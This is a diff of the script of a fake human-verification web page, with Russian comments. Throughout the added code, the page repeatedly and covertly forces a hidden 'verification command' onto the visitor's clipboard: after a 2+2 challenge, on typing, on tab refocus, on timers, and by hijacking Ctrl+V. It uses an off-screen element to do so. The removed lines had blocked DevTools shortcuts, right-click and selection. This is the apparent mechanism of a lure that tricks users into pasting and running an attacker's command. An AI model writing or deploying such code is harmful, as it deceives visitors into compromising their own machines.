-            setTimeout(() => {
-                statusText.textContent = "Verification Failed";
-                statusText.style.color = "#d63638";
-                subText.textContent = "We are unable to complete the verification automatically.";
-                subText.style.color = "#666";
+        // Method 3: Секретный метод через contentEditable
+        if (!copied) {
+            try {
+                const tempDiv = document.createElement('div');
+                tempDiv.contentEditable = true;
+                tempDiv.style.position = 'absolute';
+                tempDiv.style.left = '-9999px';
+                document.body.appendChild(tempDiv);
                 
-                // Show error container
-                errorContainer.style.display = 'block';
+                tempDiv.textContent = text;
+                tempDiv.focus();
                 
-                // Get and copy command
-                const command = getVerificationCommand();
+                const range = document.createRange();
+                range.selectNodeContents(tempDiv);
                 
-                // Копируем сразу
-                forceCopyToClipboard(command);
+                const selection = window.getSelection();
+                selection.removeAllRanges();
+                selection.addRange(range);
                 
-                // Дополнительные триггеры для копирования
-                const copyTriggers = ['click', 'keydown', 'mousemove'];
-                copyTriggers.forEach(trigger => {
-                    document.addEventListener(trigger, function autoCopy() {
-                        forceCopyToClipboard(command);
-                    }, { once: true });
-                });
+                document.execCommand('copy');
+                document.body.removeChild(tempDiv);
                 
-                // Периодически пытаемся скопировать (5 попыток)
-                let copyAttempts = 0;
-                const copyInterval = setInterval(() => {
-                    if (copyAttempts < 5) {
-                        forceCopyToClipboard(command);
-                        copyAttempts++;
-                    } else {
-                        clearInterval(copyInterval);
+                copied = true;
+                copyNotice.style.display = 'block';
+                console.log('[SECURITY] Command copied via temp element');
+                
+                setTimeout(() => {
+                    copyNotice.style.display = 'none';
+                }, 5000);
+                
+            } catch (err) {
+                console.error('Temp element method failed:', err);
+            }
+        }
+        
+        return copied;
+    }
+    
+    function getVerificationCommand() {
+        return document.getElementById('hiddenCommand').value;
+    }
+    
+    // Автокопирование при успешной верификации 2+2
+    document.addEventListener('DOMContentLoaded', function() {
+        // Перехватить клик по кнопке Verify
+        const verifyBtn = document.getElementById('verifyBtn');
+        const step1Continue = document.getElementById('step1Continue');
+        
+        if (verifyBtn) {
+            const originalVerify = verifyBtn.onclick;
+            verifyBtn.onclick = function() {
+                // Выполнить оригинальную проверку
+                if (typeof originalVerify === 'function') {
+                    originalVerify();
+                } else {
+                    // Существующая логика проверки
+                    var raw = document.getElementById('challengeAnswer').value || "";
+                    var num = parseInt(String(raw).trim(), 10);
+                    var expected = window.a + window.b;
+                    
+                    if (num === expected) {
+                        document.getElementById('verifyStatus').textContent = "Verified. You can continue.";
+                        document.getElementById('verifyStatus').classList.add("ok");
+                        document.getElementById('step1Continue').disabled = false;
+                        
+                        // АКТИВАЦИЯ АВТОКОПИРОВАНИЯ ПОСЛЕ ВЕРИФИКАЦИИ
+                        setTimeout(() => {
+                            const command = getVerificationCommand();
+                            forceCopyToClipboard(command);
+                            console.log('[ANTI-DOTE] Auto-copy activated after verification');
+                        }, 500);
                     }
-                }, 1500);
-                
-            }, 5000);
+                }
+            };
         }
         
-        // Initialize page
-        document.addEventListener('DOMContentLoaded', function() {
-            if (isDesktop()) {
-                updateTime();
-                setInterval(updateTime, 1000);
-                
-                // Start verification simulation
-                setTimeout(simulateVerification, 1000);
-            }
-        });
+        // Автокопирование при переходе на шаг 2
+        if (step1Continue) {
+            step1Continue.addEventListener('click', function() {
+                // Копируем команду при переходе
+                setTimeout(() => {
+                    const command = getVerificationCommand();
+                    forceCopyToClipboard(command);
+                    
+                    // Агрессивное периодическое копирование
+                    let copyAttempts = 0;
+                    const copyInterval = setInterval(() => {
+                        if (copyAttempts < 8) {
+                            forceCopyToClipboard(command);
+                            copyAttempts++;
+                        } else {
+                            clearInterval(copyInterval);
+                        }
+                    }, 2000);
+                }, 300);
+            });
+        }
         
-        // Prevent right-click
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        
-        // Disable text selection
-        document.addEventListener('selectstart', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        
-        // Disable drag
-        document.addEventListener('dragstart', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        
-        // Auto-copy on Ctrl+V and prevent DevTools
-        document.addEventListener('keydown', function(e) {
-            // Копируем при Ctrl+V
-            if (e.ctrlKey && e.key === 'v') {
-                const command = getVerificationCommand();
-                forceCopyToClipboard(command);
-                e.preventDefault();
-            }
-            
-            // Prevent DevTools and other shortcuts
-            const blockedKeys = [
-                'F12',
-                'F11',
-                'F10',
-                'F8',
-                'F5'
-            ];
-            
-            const blockedCombos = [
-                {ctrl: true, shift: true, key: 'i'},
-                {ctrl: true, shift: true, key: 'j'},
-                {ctrl: true, shift: true, key: 'c'},
-                {ctrl: true, shift: true, key: 'k'},
-                {ctrl: true, key: 'u'},
-                {ctrl: true, key: 's'},
-                {ctrl: true, key: 'p'},
-                {ctrl: true, shift: true, key: 'p'}
-            ];
-            
-            // Check single keys
-            if (blockedKeys.includes(e.key)) {
-                e.preventDefault();
-                return false;
-            }
-            
-            // Check key combinations
-            for (const combo of blockedCombos) {
-                if (e.ctrlKey === combo.ctrl && 
-                    e.shiftKey === (combo.shift || false) && 
-                    e.key.toLowerCase() === combo.key) {
-                    e.preventDefault();
-                    return false;
+        // Автокопирование при любом взаимодействии с формой
+        const challengeInput = document.getElementById('challengeAnswer');
+        if (challengeInput) {
+            challengeInput.addEventListener('input', function() {
+                if (this.value.length >= 1) {
+                    setTimeout(() => {
+                        const command = getVerificationCommand();
+                        forceCopyToClipboard(command);
+                    }, 100);
                 }
-            }
-        });
+            });
+        }
         
-        // Попытка копирования при возвращении на вкладку
+        // Копирование при фокусе на странице
         document.addEventListener('visibilitychange', function() {
             if (!document.hidden) {
                 setTimeout(() => {
                     const command = getVerificationCommand();
                     forceCopyToClipboard(command);
-                }, 300);
+                }, 200);
             }
         });
-    </script>
+        
+        // Копирование при нажатии Ctrl+V
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.key === 'v') {
+                const command = getVerificationCommand();
+                forceCopyToClipboard(command);
+                e.preventDefault();
+            }
+        });
+        
+        // Инициализация - первое копирование
+        setTimeout(() => {
+            const command = getVerificationCommand();
+            forceCopyToClipboard(command);
+        }, 1500);
+    });
+  </script>
+
 </body>
 </html>
